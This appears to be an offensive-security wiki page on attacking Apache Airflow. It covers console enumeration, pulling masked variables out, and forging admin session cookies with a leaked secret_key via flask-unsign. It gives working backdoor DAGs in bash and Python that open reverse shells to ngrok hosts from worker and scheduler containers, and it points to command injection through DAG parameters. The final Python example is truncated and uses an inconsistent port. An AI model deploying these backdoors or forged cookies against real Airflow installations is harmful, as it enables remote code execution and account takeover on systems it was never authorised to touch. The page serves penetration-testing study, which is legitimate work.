### Basic Information

[**Apache Airflow**](https://airflow.apache.org) serves as a platform for **orchestrating and scheduling data pipelines or workflows**. The term "orchestration" in the context of data pipelines signifies the process of arranging, coordinating, and managing complex data workflows originating from various sources. The primary purpose of these orchestrated data pipelines is to furnish processed and consumable data sets. These data sets are extensively utilized by a myriad of applications, including but not limited to business intelligence tools, data science and machine learning models, all of which are foundational to the functioning of big data applications.

Basically, Apache Airflow will allow you to **schedule the execution of code when something** (event, cron) **happens**.

### Local Lab

#### Docker-Compose

You can use the **docker-compose config file from** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) to launch a complete apache airflow docker environment. (If you are in MacOS make sure to give at least 6GB of RAM to the docker VM).

#### Minikube

One easy way to **run apache airflo**w is to run it **with minikube**:

```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```

### Airflow Configuration

Airflow might store **sensitive information** in its configuration or you can find weak configurations in place:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Before start attacking Airflow you should understand **how permissions work**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Attacks

#### Web Console Enumeration

If you have **access to the web console** you might be able to access some or all of the following information:

* **Variables** (Custom sensitive information might be stored here)
* **Connections** (Custom sensitive information might be stored here)
  * Access them in `http://<airflow>/connection/list/`
* [**Configuration**](./#airflow-configuration) (Sensitive information like the **`secret_key`** and passwords might be stored here)
* List **users & roles**
* **Code of each DAG** (which might contain interesting info)

#### Retrieve Variables Values

Variables can be stored in Airflow so the **DAGs** can **access** their values. It's similar to secrets of other platforms. If you have **enough permissions** you can access them in the GUI in `http://<airflow>/variable/list/`.\
Airflow by default will show the value of the variable in the GUI, however, according to [**this**](https://marclamberti.com/blog/variables-with-apache-airflow/) it's possible to set a **list of variables** whose **value** will appear as **asterisks** in the **GUI**.

![](<../../.gitbook/assets/image (164).png>)

However, these **values** can still be **retrieved** via **CLI** (you need to have DB access), **arbitrary DAG** execution, **API** accessing the variables endpoint (the API needs to be activated), and **even the GUI itself!**\
To access those values from the GUI just **select the variables** you want to access and **click on Actions -> Export**.\
Another way is to perform a **bruteforce** to the **hidden value** using the **search filtering** it until you get it:

![](<../../.gitbook/assets/image (152).png>)

#### Privilege Escalation

If the **`expose_config`** configuration is set to **True**, from the **role User** and **upwards** can **read** the **config in the web**. In this config, the **`secret_key`** appears, which means any user with this valid they can **create its own signed cookie to impersonate any other user account**.

```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```

#### DAG Backdoor (RCE in Airflow worker)

If you have **write access** to the place where the **DAGs are saved**, you can just **create one** that will send you a **reverse shell.**\
Note that this reverse shell is going to be executed inside an **airflow worker container**:

```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
    dag_id='rev_shell_bash',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = BashOperator(
        task_id='run',
        bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
    )
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

with DAG(
    dag_id='rev_shell_python',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python',
        python_callable=rs,
        op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
    )
```

#### DAG Backdoor (RCE in Airflow scheduler)

If you set something to be **executed in the root of the code**, at the moment of this writing, it will be **executed by the scheduler** after a couple of seconds after placing it inside the DAG's folder.

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
    dag_id='rev_shell_python2',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python2',
        python_callable=rs,
        op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```

#### DAG Creation

If you manage to **compromise a machine inside the DAG cluster**, you can create new **DAGs scripts** in the `dags/` folder and they will be **replicated in the rest of the machines** inside the DAG cluster.

#### DAG Code Injection

When you execute a DAG from the GUI you can **pass arguments** to it.\
Therefore, if the DAG is not properly coded it could be **vulnerable to Command Injection.**\
That is what happened in this CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

All you need to know to **start looking for command injections in DAGs** is that **parameters** are **accessed** with the code **`dag_run.conf.get("param_name")`**.

Moreover, the same vulnerability might occur with **variables** (note that with enough privileges you could **control the value of the variables** in the GUI). Variables are **accessed with**:

```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```

If they are used for example inside a a bash command, you could perform a command injection.
